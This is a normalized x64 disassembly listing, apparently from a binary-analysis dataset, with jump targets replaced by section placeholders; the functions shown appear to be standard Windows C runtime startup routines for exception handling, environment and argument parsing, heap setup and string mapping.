jbe r-xdata
lea r8 [ r--data ]
lea rcx [ rw-data ]
mov edx 0x2fb
call sub_140007304
test eax eax
je r-xdata
lea r8 [ r--data ]
mov rdx r13
mov rcx rdi
call sub_1400071a0
test eax eax
je r-xdata
lea rcx [ rw-data ]
call sub_140007450
lea rdx [ rw-data ]
lea r8 [ r--data ]
lea rcx [ rax + rdi - 0x22 ]
mov r9d 0x3
sub rdx rcx
call sub_14000722c
test eax eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003938
movsxd r8 ebx
mov rdx r13
mov rcx rdi
add r8 r8
mov r8 [ r14 + r8 * 8 + 0x8 ]
call sub_1400071a0
test eax eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003938
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003938
lea rdx [ r--data ]
mov r8d 0x12010
mov rcx rdi
call sub_140008f30
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_140003938
sub_1400050b4
sub rsp 0x28
mov ecx 0x3
call sub_140009124
cmp eax 0x1
je r-xdata
mov ecx 0xfc
call sub_140004e8c
mov ecx 0xff
call sub_140004e8c
mov ecx 0x3
call sub_140009124
test eax eax
jne r-xdata
add rsp 0x28
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1400050f8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r15 [ r9 + 0x8 ]
mov r12 [ r9 ]
mov rsi [ r9 + 0x38 ]
sub r12 r15
test [ rcx + 0x4 ] 0x66
mov r14 r9
mov rbp rdx
mov r13 rcx
jne r-xdata
mov rdi [ r9 + 0x20 ]
xor ebp ebp
sub rdi r15
cmp [ rsi ] ebp
jbe r-xdata
xor edi edi
mov [ rax - 0x38 ] rcx
mov [ rax - 0x30 ] r8
cmp [ rsi ] edi
jbe r-xdata
mov eax 0x1
lea rbx [ rsi + 0x10 ]
lea rbx [ rsi + 0xc ]
inc ebp
add rbx 0x10
cmp ebp [ rsi ]
jb r-xdata
mov eax [ rbx - 0x8 ]
cmp r12 rax
jae r-xdata
inc edi
add rbx 0x10
cmp edi [ rsi ]
jae r-xdata
mov eax [ rbx - 0x4 ]
cmp r12 rax
jae r-xdata
mov ecx [ rbx - 0xc ]
cmp r12 rcx
jb r-xdata
cmp rdi rcx
jb r-xdata
jmp r-xdata
cmp [ rbx + 0x4 ] 0x0
je r-xdata
cmp [ rbx ] 0x0
je r-xdata
cmp rdi rax
jae r-xdata
mov eax [ rbx - 0x8 ]
cmp r12 rax
jb r-xdata
cmp [ rbx ] 0x1
je r-xdata
mov rdx [ rsp + 0x78 ]
add rax r15
mov cl 0x1
mov [ r14 ] rax
mov r8d [ rbx - 0x4 ]
add r8 r15
call r8
mov eax [ rbx ]
cmp rdi rax
je r-xdata
test [ r13 + 0x4 ] 0x20
jne r-xdata
cmp [ r13 ] 0xe06d7363
jne r-xdata
mov eax [ rbx ]
lea rcx [ rsp + 0x30 ]
mov rdx rbp
add rax r15
call rax
test eax eax
js r-xdata
jmp r-xdata
mov ecx [ rbx + 0x4 ]
mov r8d 0x1
mov rdx rbp
add rcx r15
call sub_1400091c0
mov rax [ r14 + 0x40 ]
mov edx [ rbx + 0x4 ]
movsxd r9 [ r13 ]
mov [ rsp + 0x28 ] rax
mov rax [ r14 + 0x28 ]
add rdx r15
mov r8 r13
mov rcx rbp
mov [ rsp + 0x20 ] rax
call [ RtlUnwindEx@IAT ]
call sub_1400091f0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
jle r-xdata
lea rcx [ rw-data ]
call sub_140008bc0
test eax eax
je r-xdata
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov edx 0x1
mov rcx r13
call [ rw-data ]
sub_1400052a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov edi ecx
call sub_1400036cc
xor r11d r11d
mov rbx rax
cmp rax r11
je r-xdata
xor eax eax
mov rcx [ rax + 0xa0 ]
movsxd r8 [ rw-data ]
mov rdx rcx
mov rax r8
shl rax 0x4
add rax rcx
cmp rdx rax
jae r-xdata
mov rax r8
add rdx 0x10
shl rax 0x4
add rax rcx
cmp rdx rax
jb r-xdata
mov rdx r11
cmp [ rdx ] edi
je r-xdata
cmp [ rdx ] edi
je r-xdata
mov r8 [ rdx + 0x8 ]
cmp r8 r11
je r-xdata
cmp rdx r11
je r-xdata
cmp r8 0x5
jne r-xdata
cmp r8 0x1
jne r-xdata
mov [ rdx + 0x8 ] r11
lea eax [ r8 - 0x4 ]
jmp r-xdata
mov rbp [ rbx + 0xa8 ]
mov [ rbx + 0xa8 ] rsi
mov ecx [ rdx + 0x4 ]
cmp ecx 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rdx + 0x8 ] r11
call r8
movsxd r10 [ rw-data ]
mov ecx [ rw-data ]
add ecx r10d
mov r9 r10
cmp r10d ecx
jge r-xdata
cmp [ rdx ] 0xc000008e
mov edi [ rbx + 0xb0 ]
jne r-xdata
shl r9 0x4
cmp [ rdx ] 0xc0000090
jne r-xdata
mov [ rbx + 0xb0 ] 0x83
jmp r-xdata
mov rax [ rbx + 0xa0 ]
inc r10d
add r9 0x10
mov [ r9 + rax - 0x8 ] r11
mov ecx [ rw-data ]
mov eax [ rw-data ]
add ecx eax
cmp r10d ecx
jl r-xdata
cmp [ rdx ] 0xc0000091
jne r-xdata
mov [ rbx + 0xb0 ] 0x81
jmp r-xdata
mov edx [ rbx + 0xb0 ]
mov ecx 0x8
call r8
mov [ rbx + 0xb0 ] edi
jmp r-xdata
cmp [ rdx ] 0xc0000093
jne r-xdata
mov [ rbx + 0xb0 ] 0x84
jmp r-xdata
mov [ rbx + 0xa8 ] rbp
jmp r-xdata
cmp [ rdx ] 0xc000008d
jne r-xdata
mov [ rbx + 0xb0 ] 0x85
jmp r-xdata
cmp [ rdx ] 0xc000008f
jne r-xdata
mov [ rbx + 0xb0 ] 0x82
jmp r-xdata
cmp [ rdx ] 0xc0000092
jne r-xdata
mov [ rbx + 0xb0 ] 0x86
jmp r-xdata
mov [ rbx + 0xb0 ] 0x8a
sub_140005470
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x30
mov rbx [ rw-data ]
xor r12d r12d
mov edi r12d
cmp rbx r12
jne r-xdata
movzx eax [ rbx ]
cmp ax r12w
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ax 0x3d
je r-xdata
lea eax [ rdi + 0x1 ]
mov edx 0x8
movsxd rcx eax
call sub_140006a80
mov rdi rax
mov [ rw-data ] rax
cmp rax r12
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
mov rcx rbx
call sub_140009278
lea rbx [ rbx + rax * 2 + 0x2 ]
inc edi
mov rbx [ rw-data ]
cmp [ rbx ] r12w
je r-xdata
mov rcx rbx
call sub_1400069d4
mov [ rw-data ] r12
mov [ rdi ] r12
mov [ rw-data ] 0x1
xor eax eax
mov rcx rbx
call sub_140009278
cmp [ rbx ] 0x3d
lea esi [ rax + 0x1 ]
je r-xdata
movsxd rax esi
lea rbx [ rbx + rax * 2 ]
cmp [ rbx ] r12w
jne r-xdata
movsxd rbp esi
mov edx 0x2
mov rcx rbp
call sub_140006a80
mov [ rdi ] rax
cmp rax r12
je r-xdata
mov rbx [ rw-data ]
mov rcx [ rw-data ]
call sub_1400069d4
mov [ rw-data ] r12
jmp r-xdata
mov r8 rbx
mov rdx rbp
mov rcx rax
call sub_1400091f4
cmp eax r12d
je r-xdata
add rdi 0x8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r12
call sub_140003938
sub_1400055a8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r13
push r14
mov r11 [ rsp + 0x30 ]
xor esi esi
mov rbx r9
mov [ r11 ] esi
mov [ r9 ] 0x1
mov r10 rdx
cmp rdx rsi
je r-xdata
mov edx esi
mov r14d 0x22
mov [ rdx ] r8
add r10 0x8
inc [ r11 ]
cmp r8 rsi
je r-xdata
cmp edx esi
mov eax esi
sete al
add rcx 0x2
mov edx eax
movzx eax r14w
jmp r-xdata
mov ax [ rcx ]
add rcx 0x2
cmp ax si
je r-xdata
movzx eax [ rcx ]
mov [ r8 ] ax
add r8 0x2
cmp edx esi
jne r-xdata
sub rcx 0x2
cmp [ rcx ] r14w
jne r-xdata
cmp ax 0x20
je r-xdata
cmp r10 rsi
je r-xdata
cmp [ rcx ] 0x20
je r-xdata
cmp r8 rsi
je r-xdata
cmp ax 0x9
jne r-xdata
inc [ rbx ]
mov rsi [ rsp + 0x18 ]
mov rdi [ rsp + 0x20 ]
mov rbx [ rsp + 0x10 ]
mov r13 [ rsp + 0x28 ]
pop r14
retn
mov [ r10 ] rsi
add rcx 0x2
jmp r-xdata
cmp [ rcx ] 0x9
jne r-xdata
mov edi esi
mov r13d 0x5c
mov [ r8 - 0x2 ] si
jmp r-xdata
cmp [ rcx ] si
je r-xdata
cmp r10 rsi
je r-xdata
inc [ rbx ]
mov [ r10 ] r8
add r10 0x8
cmp [ rcx ] r13w
je r-xdata
add rcx 0x2
inc edx
cmp [ rcx ] r14w
jne r-xdata
cmp edx esi
jne r-xdata
test r9b dl
jne r-xdata
dec edx
cmp r8 rsi
je r-xdata
movzx eax [ rcx ]
cmp ax si
je r-xdata
shr edx 0x1
jmp r-xdata
cmp edi esi
je r-xdata
inc [ r11 ]
mov [ r8 ] r13w
add r8 0x2
cmp r8 rsi
je r-xdata
cmp edi esi
jne r-xdata
cmp edi esi
mov eax esi
mov r9d esi
sete al
mov edi eax
lea rax [ rcx + 0x2 ]
cmp [ rax ] r14w
jne r-xdata
inc [ r11 ]
jmp r-xdata
mov [ r8 ] si
add r8 0x2
cmp r9d esi
je r-xdata
cmp ax 0x20
je r-xdata
mov rcx rax
jmp r-xdata
cmp [ rcx ] si
je r-xdata
add rcx 0x2
jmp r-xdata
cmp r8 rsi
je r-xdata
cmp ax 0x9
je r-xdata
mov r9d 0x1
mov edx esi
jmp r-xdata
inc [ r11 ]
mov [ r8 ] ax
add r8 0x2
sub_140005740
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
sub rsp 0x30
lea rdi [ rw-data ]
xor ebp ebp
mov r8d 0x104
mov rdx rdi
xor ecx ecx
mov [ rw-data ] bp
call [ GetModuleFileNameW@IAT ]
mov rbx [ rw-data ]
mov [ rw-data ] rdi
cmp rbx rbp
je r-xdata
mov rbx rdi
cmp [ rbx ] bp
jne r-xdata
or eax 0xffffffff
movsxd rax [ rsp + 0x58 ]
mov rcx 0x7fffffffffffffff
cmp rax rcx
jae r-xdata
lea rax [ rsp + 0x58 ]
lea r9 [ rsp + 0x50 ]
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_1400055a8
movsxd rsi [ rsp + 0x50 ]
mov rax 0x1fffffffffffffff
cmp rsi rax
jae r-xdata
lea rcx [ rax + rsi * 4 ]
add rax rax
add rcx rcx
cmp rcx rax
jb r-xdata
call sub_140006a14
mov rdi rax
cmp rax rbp
je r-xdata
lea r8 [ rax + rsi * 8 ]
lea rax [ rsp + 0x58 ]
lea r9 [ rsp + 0x50 ]
mov rdx rdi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_1400055a8
mov r11d [ rsp + 0x50 ]
mov [ rw-data ] rdi
dec r11d
xor eax eax
mov [ rw-data ] r11d
jmp r-xdata
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
sub_140005830
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
call [ GetEnvironmentStringsW@IAT ]
xor ebx ebx
mov rdi rax
cmp rax rbx
jne r-xdata
cmp [ rdi ] bx
je r-xdata
xor eax eax
jmp r-xdata
sub eax edi
add eax 0x2
movsxd rbp eax
mov rcx rbp
call sub_140006a14
mov rsi rax
cmp rax rbx
je r-xdata
add rax 0x2
cmp [ rax ] bx
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rax rbx
mov r8 rbp
mov rdx rdi
mov rcx rax
call sub_140006ba0
mov rbx rsi
add rax 0x2
cmp [ rax ] bx
jne r-xdata
sub_1400058c4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
push r14
push r15
sub rsp 0x90
lea rcx [ rsp + 0x20 ]
call [ GetStartupInfoA@IAT ]
nop
mov edx 0x58
lea r12d [ rdx - 0x38 ]
mov rcx r12
call sub_140006a80
mov r11 rax
xor r15d r15d
cmp rax r15
jne r-xdata
mov [ rw-data ] rax
mov ecx r12d
mov [ rw-data ] ecx
add rax 0xb00
cmp r11 rax
jae r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x62 ] r15w
je r-xdata
mov [ r11 + 0x8 ] r15b
or [ r11 ] 0xffffffffffffffff
mov [ r11 + 0x9 ] 0xa
mov [ r11 + 0xc ] r15d
mov [ r11 + 0x38 ] r15b
mov [ r11 + 0x39 ] 0xa
mov [ r11 + 0x3a ] 0xa
mov [ r11 + 0x50 ] r15d
mov [ r11 + 0x4c ] r15b
add r11 0x58
mov rax [ rw-data ]
add rax 0xb00
cmp r11 rax
jb r-xdata
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r14
pop r13
retn
mov r12d r15d
mov rdi r15
mov rax [ rsp + 0x68 ]
cmp rax r15
je r-xdata
mov ecx [ rw-data ]
mov [ rbx + 0x8 ] 0x81
lea eax [ r12 - 0x1 ]
neg eax
sbb ecx ecx
add ecx 0xfffffff5
mov eax 0xfffffff6
cmp r12d r15d
cmove ecx eax
call [ GetStdHandle@IAT ]
mov rsi rax
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbx ] 0xfffffffffffffffe
je r-xdata
lea r13 [ rax + 0x4 ]
movsxd rsi [ rax ]
add rsi r13
mov ebx 0x800
cmp [ rax ] ebx
cmovl ebx [ rax ]
mov edi 0x1
cmp ecx ebx
jge r-xdata
or [ rbx + 0x8 ] 0x40
mov [ rbx ] 0xfffffffffffffffe
cmp rax r15
je r-xdata
or [ rbx + 0x8 ] 0x80
jmp r-xdata
lea r14 [ rw-data ]
lea r14 [ rw-data ]
mov rbx rdi
imul rbx rbx 0x58
add rbx [ rw-data ]
cmp [ rbx ] 0xffffffffffffffff
je r-xdata
mov ecx [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
mov rcx rax
call [ GetFileType@IAT ]
cmp eax r15d
je r-xdata
inc r12d
inc rdi
cmp rdi 0x3
jl r-xdata
cmp [ rsi ] 0xffffffffffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov [ r14 + rdi * 8 ] rax
mov eax [ rw-data ]
add eax r12d
mov [ rw-data ] eax
lea rcx [ r11 + 0xb00 ]
cmp r11 rcx
jae r-xdata
mov [ rbx ] rsi
movzx eax al
cmp eax 0x2
jne r-xdata
inc edi
inc r13
add rsi 0x8
cmp edi ebx
jl r-xdata
cmp [ rsi ] 0xfffffffffffffffe
je r-xdata
mov edi r15d
cmp ebx r15d
jle r-xdata
inc rdi
cmp eax ebx
jl r-xdata
mov [ r11 + 0x8 ] r15b
or [ r11 ] 0xffffffffffffffff
mov [ r11 + 0x9 ] 0xa
mov [ r11 + 0xc ] r15d
and [ r11 + 0x38 ] 0x80
mov [ r11 + 0x39 ] 0xa
mov [ r11 + 0x3a ] 0xa
mov [ r11 + 0x50 ] r15d
mov [ r11 + 0x4c ] r15b
add r11 0x58
mov rax [ r14 + rdi * 8 ]
add rax 0xb00
cmp r11 rax
jb r-xdata
cmp eax 0x3
jne r-xdata
or [ rbx + 0x8 ] 0x40
jmp r-xdata
test [ r13 ] 0x1
je r-xdata
mov edx 0x58
mov rcx r12
call sub_140006a80
mov r11 rax
cmp rax r15
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
lea rcx [ rbx + 0x10 ]
mov edx 0xfa0
call sub_140008ebc
cmp eax r15d
je r-xdata
or [ rbx + 0x8 ] 0x8
test [ r13 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ rbx + 0xc ]
jmp r-xdata
movsxd r12 edi
mov rax r12
sar rax 0x5
and r12d 0x1f
imul r12 r12 0x58
add r12 [ r14 + rax * 8 ]
mov rax [ rsi ]
mov [ r12 ] rax
mov al [ r13 ]
mov [ r12 + 0x8 ] al
lea rcx [ r12 + 0x10 ]
mov edx 0xfa0
call sub_140008ebc
cmp eax r15d
je r-xdata
mov rcx [ rsi ]
call [ GetFileType@IAT ]
cmp eax r15d
je r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ r12 + 0xc ]
jmp r-xdata
sub_140005bb4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_140005bec
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_140005c24
mov [ rsp + 0x8 ] ecx
sub rsp 0x28
xor r8d r8d
mov edx 0x1000
xor ecx ecx
call [ HeapCreate@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
add rsp 0x28
retn
lea r8 [ rsp + 0x30 ]
mov r9d 0x4
xor edx edx
mov rcx rax
mov [ rsp + 0x30 ] 0x2
call [ HeapSetInformation@IAT ]
mov eax 0x1
sub_140005c70
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
mov rax [ rw-data ]
and [ rsp + 0x30 ] 0x0
mov rdi 0x2b992ddfa232
cmp rax rdi
je r-xdata
lea rcx [ rsp + 0x30 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
not rax
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_140005d40
mov rax rcx
cmp r8 0x8
jb r-xdata
test r8 r8
je r-xdata
movzx edx dl
mov r9 0x101010101010101
imul rdx r9
cmp r8 0x40
jb r-xdata
retn
mov [ rcx ] dl
inc rcx
dec r8
jne r-xdata
mov r9 r8
and r8 0x7
shr r9 0x3
je r-xdata
neg rcx
and ecx 0x7
je r-xdata
nop
nop
add rcx rax
mov r9 r8
and r8 0x3f
shr r9 0x6
jne r-xdata
sub r8 rcx
mov [ rax ] rdx
mov [ rcx ] rdx
add rcx 0x8
dec r9
jne r-xdata
cmp r9 0x1c00
jae r-xdata
movnti [ rcx ] rdx
movnti [ rcx + 0x8 ] rdx
movnti [ rcx + 0x10 ] rdx
add rcx 0x40
movnti [ rcx - 0x28 ] rdx
movnti [ rcx - 0x20 ] rdx
dec r9
movnti [ rcx - 0x18 ] rdx
movnti [ rcx - 0x10 ] rdx
movnti [ rcx - 0x8 ] rdx
jne r-xdata
mov [ rcx ] rdx
mov [ rcx + 0x8 ] rdx
mov [ rcx + 0x10 ] rdx
add rcx 0x40
mov [ rcx - 0x28 ] rdx
mov [ rcx - 0x20 ] rdx
dec r9
mov [ rcx - 0x18 ] rdx
mov [ rcx - 0x10 ] rdx
mov [ rcx - 0x8 ] rdx
jne r-xdata
[ rsp ] 0x0
jmp r-xdata
jmp r-xdata
sub_140005e2c
push rbx
sub rsp 0x20
mov r11d [ r8 ]
mov rbx rdx
mov r9 rcx
and r11d 0xfffffff8
test [ r8 ] 0x4
mov r10 rcx
je r-xdata
movsxd rax r11d
mov rdx [ rax + r10 ]
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0x8 ]
add rcx [ rbx + 0x8 ]
test [ rcx + 0x3 ] 0xf
je r-xdata
mov eax [ r8 + 0x8 ]
movsxd r10 [ r8 + 0x4 ]
neg eax
add r10 rcx
movsxd rcx eax
and r10 rcx
xor r9 rdx
mov rcx r9
add rsp 0x20
pop rbx
jmp sub_140002370
movzx eax [ rcx + 0x3 ]
and eax 0xfffffff0
cdqe
add r9 rax
sub_140005eb0
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x60
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x50 ] rbx
mov [ rbp + 0x58 ] rsi
mov [ rbp + 0x60 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x18 ] rax
mov r10d [ rw-data ]
mov esi 0x2
xor edi edi
mov r11 r9
mov [ rbp + 0x10 ] r9
mov [ rbp ] r8d
mov r14d edx
mov [ rbp + 0x8 ] edx
mov rbx rcx
lea r13d [ rsi - 0x1 ]
cmp r10d edi
jne r-xdata
mov r9d [ rbp + 0x70 ]
cmp r9d edi
jle r-xdata
lea r8 [ r--data ]
mov r9d r13d
mov edx 0x100
xor ecx ecx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
call [ LCMapStringW@IAT ]
cmp eax edi
je r-xdata
cmp r10d esi
je r-xdata
mov ecx r9d
mov rax r11
call [ GetLastError@IAT ]
mov r10d [ rw-data ]
cmp eax 0x78
cmove r10d esi
mov [ rw-data ] r10d
mov r10d r13d
mov [ rw-data ] r13d
jmp r-xdata
mov rsi rdi
mov r12 rdi
cmp r14d edi
jne r-xdata
cmp r10d edi
je r-xdata
mov eax r9d
sub eax ecx
sub eax r13d
cmp eax r9d
jge r-xdata
add rax r13
cmp ecx edi
jne r-xdata
mov r11 [ rbp + 0x10 ]
mov edi [ rbp + 0x88 ]
test edi edi
jne r-xdata
mov rax [ rbx ]
mov r14d [ rax + 0x14 ]
mov [ rbp + 0x8 ] r14d
cmp r10d r13d
jne r-xdata
mov r9d eax
mov [ rbp + 0x70 ] eax
lea r9d [ rax + 0x1 ]
mov [ rbp + 0x70 ] r9d
jmp r-xdata
sub ecx r13d
cmp [ rax ] dil
je r-xdata
or ecx 0xffffffff
mov ecx r14d
call sub_140009294
mov r13d eax
cmp eax 0xffffffff
jne r-xdata
mov rax [ rbx ]
mov edi [ rax + 0x4 ]
xor eax eax
jmp r-xdata
mov r12d [ rbp + 0x88 ]
mov esi edi
cmp r12d edi
jne r-xdata
mov r15 [ rbp + 0x78 ]
mov r8 [ rbp + 0x10 ]
cmp eax edi
je r-xdata
mov rcx [ rbp + 0x18 ]
xor rcx rbp
call sub_140002370
mov rbx [ rbp + 0x50 ]
mov rsi [ rbp + 0x58 ]
mov rdi [ rbp + 0x60 ]
lea rsp [ rbp + 0x20 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
neg [ rbp + 0x90 ]
mov r8 r11
mov ecx r12d
sbb edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
and edx 0x8
add edx r13d
call [ MultiByteToWideChar@IAT ]
movsxd r15 eax
cmp r15d edi
je r-xdata
mov rax [ rbx ]
mov r12d [ rax + 0x4 ]
mov eax [ rbp + 0x80 ]
mov r9d [ rbp + 0x70 ]
mov edx [ rbp ]
mov [ rsp + 0x28 ] eax
mov ecx r14d
mov [ rsp + 0x20 ] r15
call [ LCMapStringA@IAT ]
mov edi eax
xor ebx ebx
lea r9 [ rbp + 0x70 ]
mov edx eax
mov ecx edi
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call sub_1400092e8
mov rsi rax
cmp rax rbx
je r-xdata
mov rbx 0xffffffffffffff0
mov r14d 0xdddd
mov r13d 0x400
jle r-xdata
cmp r12 rbx
je r-xdata
mov rcx rsi
call sub_1400069d4
mov r9d [ rbp + 0x70 ]
mov edx [ rbp ]
mov r8 rax
mov ecx r14d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call [ LCMapStringA@IAT ]
movsxd r9 eax
mov [ rbp + 0x4 ] r9d
cmp r9d ebx
jne r-xdata
test rdi rdi
je r-xdata
xor edx edx
lea rax [ rdx - 0x20 ]
div r15
cmp rax 0x2
jb r-xdata
mov eax edi
cmp r15 r12
je r-xdata
cmp r9d ebx
mov r14d 0xdddd
jle r-xdata
mov edi ebx
jmp r-xdata
mov r9d [ rbp + 0x70 ]
mov r8 [ rbp + 0x10 ]
mov edx 0x1
mov ecx r12d
mov [ rsp + 0x28 ] r15d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
lea rcx [ r15 + r15 + 0x10 ]
cmp rcx r13
ja r-xdata
mov rcx r12
call sub_1400069d4
test rbx rbx
jne r-xdata
mov rcx r9
cmp r9 0xffffffffffffffe0
ja r-xdata
cmp rsi rbx
je r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] r14d
jne r-xdata
mov edx [ rbp ]
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
mov ecx [ rbp + 0x8 ]
mov r9d r15d
mov r8 rdi
call [ LCMapStringW@IAT ]
xor r8d r8d
movsxd rsi eax
cmp esi r8d
je r-xdata
call sub_140009570
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
movsxd r8 r9d
xor edx edx
mov rcx rbx
call sub_140005d40
mov r11d [ rbp + 0x4 ]
mov r9d [ rbp + 0x70 ]
mov edx [ rbp ]
mov ecx [ rbp + 0x8 ]
mov [ rsp + 0x28 ] r11d
mov r8 rsi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringA@IAT ]
mov [ rbp + 0x4 ] eax
test eax eax
jne r-xdata
xor ebx ebx
jmp r-xdata
add rcx 0x10
cmp rcx 0x400
ja r-xdata
mov eax esi
jmp r-xdata
call sub_1400069d4
mov r10d [ rbp ]
bt r10d 0xa
jae r-xdata
mov [ rax ] r14d
and rax 0xfffffffffffffff0
call sub_14000a7a0
sub rsp rax
lea rdi [ rsp + 0x40 ]
test rdi rdi
je r-xdata
mov rax rbx
mov eax [ rbp + 0x80 ]
lea r9 [ rbp + 0x4 ]
mov r8 rbx
mov [ rsp + 0x28 ] eax
mov edx edi
mov ecx r13d
mov [ rsp + 0x20 ] r15
call sub_1400092e8
mov edi [ rbp + 0x4 ]
mov r12 rax
xor eax eax
cmp r12 rax
cmove edi eax
xor edi edi
jmp r-xdata
call sub_140009570
mov rbx rax
test rax rax
je r-xdata
lea rbx [ rcx + 0xf ]
cmp rbx rcx
ja r-xdata
cmp esi r8d
jle r-xdata
mov eax [ rbp + 0x80 ]
cmp eax r8d
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
xor ebx ebx
call sub_1400069d4
jmp r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] r14d
jne r-xdata
mov r9d [ rbp + 0x4 ]
mov [ rax ] r14d
and rbx 0xfffffffffffffff0
mov rax rbx
call sub_14000a7a0
sub rsp rbx
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rbx 0xffffffffffffff0
mov rbx r8
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
cmp esi eax
jg r-xdata
add rdi 0x10
mov [ rbx ] 0xcccc
jmp r-xdata
mov ecx [ rbp + 0x8 ]
mov r9d r15d
mov r8 rdi
mov edx r10d
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call [ LCMapStringW@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx r13
